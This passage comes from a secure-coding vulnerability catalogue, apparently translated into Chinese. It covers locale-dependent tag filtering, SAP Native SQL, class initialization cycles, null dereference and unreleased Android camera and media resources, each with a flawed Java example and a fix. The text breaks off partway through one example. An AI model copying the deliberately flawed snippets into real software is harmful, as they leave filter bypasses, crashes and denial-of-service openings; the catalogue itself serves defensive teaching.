<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Locale;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  public String tagProcessor(String tag)&#123;</span><br><span class="line"></span><br><span class="line">    if (tag.toUpperCase(Locale.ENGLISH).equals(&quot;SCRIPT&quot;))&#123;</span><br><span class="line"></span><br><span class="line">      return null;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //does not contain SCRIPT tag, keep processing input</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>示例 3：以下示例使用了函数 java.lang.String.equalsIgnoreCase() API 以防止出现此问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public String tagProcessor(String tag)&#123;</span><br><span class="line"></span><br><span class="line">  if (tag.equalsIgnoreCase(&quot;SCRIPT&quot;))&#123;</span><br><span class="line"></span><br><span class="line">    return null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //does not contain SCRIPT tag, keep processing input</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>因为 equalsIgnoreCase() 会更改与 Character.toLowerCase() 和 Character.toUpperCase() 类似的内容，所以可以防止此问题。这涉及到使用来自 UnicodeData 文件（由 Unicode 联盟维护的 Unicode 字符数据库的一部分）的信息创建这两种字符串的临时标准格式。即使这可能会导致这些字符在被读取时以不可读的方式呈现出来，但却能够在独立于区域设置的情况下进行比较。</p>
<h5 id="REFERENCES-79"><a href="#REFERENCES-79" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] STR02-J. Specify an appropriate locale when comparing locale-dependent data CERT</p>
<p>[2] String (JavaDoc) Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 474</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002520 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002520 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002520 CAT II</p>
<h4 id="Portability-Flaw-Native-SQL"><a href="#Portability-Flaw-Native-SQL" class="headerlink" title="Portability Flaw: Native SQL"></a>Portability Flaw: Native SQL</h4><h5 id="ABSTRACT-81"><a href="#ABSTRACT-81" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 Native SQL 会导致可移植性问题。</p>
<h5 id="EXPLANATION-82"><a href="#EXPLANATION-82" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>最初设计时，SAP 系统是独立于平台的。Open SQL（SAP 的可移植 SQL 语言）使应用程序可独立于特定数据库供应商的 JDBC 驱动程序。使用 Open SQL 可抽象化处理底层数据库的各种繁杂项，为所有数据库操作提供应用程序的通用接口。但是，Native SQL 特定于底层数据库，因此在其他平台上使用时可能会导致应用程序逻辑执行错误和拒绝服务。</p>
<p>示例 1：以下代码使用 Native SQL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">import java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line">import com.sap.sql.NativeSQLAccess;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">String mssOnlyStmt = &quot;...&quot;;</span><br><span class="line"></span><br><span class="line">// variant 1</span><br><span class="line"></span><br><span class="line">  PreparedStatement ps =</span><br><span class="line"></span><br><span class="line">  NativeSQLAccess.prepareNativeStatement(</span><br><span class="line"></span><br><span class="line">    conn, mssOnlyStmt);</span><br><span class="line"></span><br><span class="line">  . . .</span><br><span class="line"></span><br><span class="line">// variant 2</span><br><span class="line"></span><br><span class="line">  Statement stmt =</span><br><span class="line"></span><br><span class="line">  NativeSQLAccess.createNativeStatement(conn);</span><br><span class="line"></span><br><span class="line">  int result = stmt.execute(mssOnlyStmt);</span><br><span class="line"></span><br><span class="line">  . . .</span><br><span class="line"></span><br><span class="line">// variant 3</span><br><span class="line"></span><br><span class="line">  CallableStatement cs =</span><br><span class="line"></span><br><span class="line">  NativeSQLAccess.prepareNativeCall(</span><br><span class="line"></span><br><span class="line">  conn, mssOnlyStmt);</span><br><span class="line"></span><br><span class="line">  . . .</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-83"><a href="#RECOMMENDATIONS-83" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为编写可移植代码，不应使用 Native SQL，而应使用独立于平台的 Open SQL。 示例 2：以下代码实现的功能与示例 1 相同，不过采用的是 Open SQL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">import java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">String mssOnlyStmt = &quot;...&quot;;</span><br><span class="line"></span><br><span class="line">// variant 1</span><br><span class="line"></span><br><span class="line">  PreparedStatement ps =</span><br><span class="line"></span><br><span class="line">  conn.prepareStatement(mssOnlyStmt);</span><br><span class="line"></span><br><span class="line">  . . .</span><br><span class="line"></span><br><span class="line">// variant 2</span><br><span class="line"></span><br><span class="line">  Statement stmt =</span><br><span class="line"></span><br><span class="line">  conn.createStatement( );</span><br><span class="line"></span><br><span class="line">  int result = stmt.executeUpdate(mssOnlyStmt);</span><br><span class="line"></span><br><span class="line">  . . .</span><br><span class="line"></span><br><span class="line">// variant 3</span><br><span class="line"></span><br><span class="line">  CallableStatement cs =</span><br><span class="line"></span><br><span class="line">  conn.prepareCall(mssOnlyStmt);</span><br><span class="line"></span><br><span class="line">  . . .</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-80"><a href="#REFERENCES-80" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 474</p>
<h4 id="Race-Condition-Class-Initialization-Cycle"><a href="#Race-Condition-Class-Initialization-Cycle" class="headerlink" title="Race Condition: Class Initialization Cycle"></a>Race Condition: Class Initialization Cycle</h4><h5 id="ABSTRACT-82"><a href="#ABSTRACT-82" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>为新对象分配静态字段会调用构造函数，即使其依赖于其他变量初始化也是如此，这会导致为对象错误地执行初始化。</p>
<h5 id="EXPLANATION-83"><a href="#EXPLANATION-83" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在对 Java 类执行初始化后，会先为类中声明的静态字段调用初始值设定项，然后再调用类的构造函数。这意味着，向其分配的构造函数会先于其他代码被调用，如果此构造函数依赖于其他要初始化的字段或变量，这可能会导致对象仅部分完成初始化，或使用错误的值为对象执行初始化。</p>
<p>示例 1：以下类声明了静态字段，并将其分配至新对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public class Box&#123;</span><br><span class="line"></span><br><span class="line">  public int area;</span><br><span class="line"></span><br><span class="line">  public static final int width = 10;</span><br><span class="line"></span><br><span class="line">  public static final Box box = new Box();</span><br><span class="line"></span><br><span class="line">  public static final int height = (int) (Math.random() * 100);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  public Box()&#123;</span><br><span class="line"></span><br><span class="line">      area = width * height;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在以上代码中，因为 width 等于 10，所以开发人员可能会希望 box.area 是 10 的随机整数倍。但在现实情况中，它可能始终具有硬编码值 0。首先会对已声明具有编译时常量的静态最终字段执行初始化，然后再依次执行各代码。这意味着：由于 height 并非编译时常量，因此在声明 box 后才会对其进行声明，从而造成在调用构造函数后对 height 执行初始化。</p>
<p>示例 2：以下类声明了互相依赖的静态字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">class Foo&#123;</span><br><span class="line"></span><br><span class="line">  public static final int f = Bar.b - 1;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">class Bar&#123;</span><br><span class="line"></span><br><span class="line">  public static final int b = Foo.f + 1;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This example is perhaps easier to identify, but would be dependent on which class is loaded first by the JVM. In this example Foo.f could be either -1 or 0, and Bar.b could be either 0 or 1.</p>
<h5 id="RECOMMENDATIONS-84"><a href="#RECOMMENDATIONS-84" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>由于初始化循环较为复杂，因此解决该问题比较困难。此外，如果没有正确修复此问题，会导致在未来代码维护中产生回归。有时，最佳解决方法可能是重新构建某些类，以消除对静态字段的需要。</p>
<p>示例 3：以下代码仅通过更改指令排序即可修复示例 1 的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public class Box&#123;</span><br><span class="line"></span><br><span class="line">  public int area;</span><br><span class="line"></span><br><span class="line">  public static final int width = 10;</span><br><span class="line"></span><br><span class="line">  public static final int height = (int) (Math.random() * 100); </span><br><span class="line"></span><br><span class="line">  public static final Box box = new Box(); //this needs to be specified below others it is dependent upon</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  public Box()&#123;</span><br><span class="line"></span><br><span class="line">      area = width * height;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>尽管问题得到了修复，但是这并不是最佳的解决方法，因为其依赖于从事相同基本代码的其他开发人员来正确地读取注释，并且没有在以下代码内插入任何其他的注释，而 box 的构造函数在未来可能需要依赖于此代码。</p>
<p>示例 4：以下代码提供了更好的解决方法，即修改代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public class Polygon&#123;</span><br><span class="line"></span><br><span class="line">  protected int area;</span><br><span class="line"></span><br><span class="line">  protected final int width = 10;</span><br><span class="line"></span><br><span class="line">  protected final int height = (int) (Math.random() * 100); </span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Box extends Polygon&#123;</span><br><span class="line"></span><br><span class="line">  public Box()&#123;</span><br><span class="line"></span><br><span class="line">    area = width * height;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-81"><a href="#REFERENCES-81" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] DCL00-J. Prevent class initialization cycles CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 362, CWE ID 367</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[6] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 362</p>
<p>[7] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 362</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3630.1 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3630.1 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3630.1 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3630.1 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3630.1 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3630.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3630.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001995 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001995 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001995 CAT II</p>
<h4 id="Redundant-Null-Check"><a href="#Redundant-Null-Check" class="headerlink" title="Redundant Null Check"></a>Redundant Null Check</h4><h5 id="ABSTRACT-83"><a href="#ABSTRACT-83" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序可能会间接引用一个 null 指针，从而引起 null 指针异常。</p>
<h5 id="EXPLANATION-84"><a href="#EXPLANATION-84" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当违反程序员的一个或多个假设时，通常会出现 null 指针异常。具体来说，如果程序明确检查过该指针为 null，但仍继续间接引用该对象，则将出现 dereference-after-check 错误。此类错误通常是由于错别字或程序员失察造成的。</p>
<p>大部分 null 指针问题会导致出现一般的软件可靠性问题，但如果攻击者能故意使程序间接引用 null 指针，那么攻击者可能会利用引发的异常发动 denial of service 攻击，或使应用程序泄漏调试信息，这些信息对于他们制定接下来的攻击计划是十分有价值的。</p>
<p>例 1：在下列代码中，程序员确认变量 foo 为 null，然后错误地进行间接引用。如果在 if 指令中检查时发现 foo 为 null，则会发生 null dereference，从而引起 null 指针异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (foo == null) &#123;</span><br><span class="line"></span><br><span class="line">	foo.setBar(val);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-85"><a href="#RECOMMENDATIONS-85" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在间接引用可能为 null 值的对象之前，请务必仔细检查。如有可能，在处理资源的代码周围的包装器中纳入 null 检查，确保在所有情况下均会执行 null 检查，并最大限度地减少出错的地方。</p>
<h5 id="REFERENCES-82"><a href="#REFERENCES-82" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 476</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[3] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[15] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[16] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Android-Camera"><a href="#Unreleased-Resource-Android-Camera" class="headerlink" title="Unreleased Resource: Android Camera"></a>Unreleased Resource: Android Camera</h4><h5 id="ABSTRACT-84"><a href="#ABSTRACT-84" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Android 活动未能在其 onPause()、onStop() 或 onDestroy() 事件处理器中释放 Camera 实例。</p>
<h5 id="EXPLANATION-85"><a href="#EXPLANATION-85" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Android 活动分配了在 onPause()、onStop() 或 onDestroy() 回调函数中未释放的 Camera 实例。当 Android OS 需要将当前活动发送到后台或在系统资源不足时暂时中断活动时，会调用这些回调函数。如果未能正确释放 Camera 对象，该活动会阻止其他应用程序（或者同一应用程序的未来实例）访问照相机。另外，活动暂停时仍占用 Camera 实例会导致不必要的电池电量消耗，从而对用户体验造成负面影响。</p>
<p>示例：以下代码描述了一项 Android 活动，其中没有替代用于释放 Camera 对象的基本 onPause() 方法，也没有在关机顺序中正确释放该对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class UnreleasedCameraActivity extends Activity &#123;</span><br><span class="line"></span><br><span class="line">  private Camera cam;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onCreate(Bundle state) &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onRestart() &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onStop() &#123;</span><br><span class="line"></span><br><span class="line">      cam.stopPreview();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-86"><a href="#RECOMMENDATIONS-86" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果应用程序使用照相机，则必须替代活动的 onPause() 方法，以及 onStop() 和 onDestroy() 中的至少一种方法。对于每个方法，请确保调用 Camera 对象上的 release() 以节省系统资源。释放 Camera 实例后，可通过在 onResume() 回调中重新配置和重新获取该实例来继续使用 Android 的内置照相机。</p>
<p>此外，在应用程序执行过程中，如果在一段时间内不使用 Camera 实例，将其释放通常不失为一个好方法。当应用程序再次需要该资源时，按上述方法重新配置和重新获取即可。</p>
<h5 id="REFERENCES-83"><a href="#REFERENCES-83" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Camera, Android Developers</p>
<p>[2] FIO04-J. Release resources when they are no longer needed CERT</p>
<p>[3] DOS-2: Release resources in all cases Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 404, CWE ID 619</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 404</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Unreleased-Resource-Android-Media"><a href="#Unreleased-Resource-Android-Media" class="headerlink" title="Unreleased Resource: Android Media"></a>Unreleased Resource: Android Media</h4><h5 id="ABSTRACT-85"><a href="#ABSTRACT-85" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Android 活动未能在其 onPause()、onStop() 或 onDestroy() 事件处理器中释放 MediaRecorder、MediaPlayer 或 AudioRecord 对象。</p>
<h5 id="EXPLANATION-86"><a href="#EXPLANATION-86" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Android 活动分配了在 onPause()、onStop() 或 onDestroy() 回调中未释放的媒体对象。当 Android OS 需要将当前活动发送到后台或在系统资源不足时暂时中断活动时，会调用这些回调函数。由于未能正确释放媒体对象，该活动导致（其他应用程序或者同一应用程序）随后对 Android 媒体硬件的访问转而依靠软件来实现，甚至彻底失败。打开过多未释放的媒体实例可导致 Android 抛出异常，最终导致 denial of service。另外，活动暂停时仍占用媒体实例会导致不必要的电池电量消耗，从而对用户体验造成负面影响。</p>
<p>示例：以下代码描述了一项 Android 活动，其中没有替代用于释放媒体对象的基本 onPause() 方法，也没有在关机顺序中正确释放该对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public class UnreleasedMediaActivity extends Activity &#123;</span><br><span class="line"></span><br><span class="line">  private MediaPlayer mp;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onCreate(Bundle state) &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void onRestart() &#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  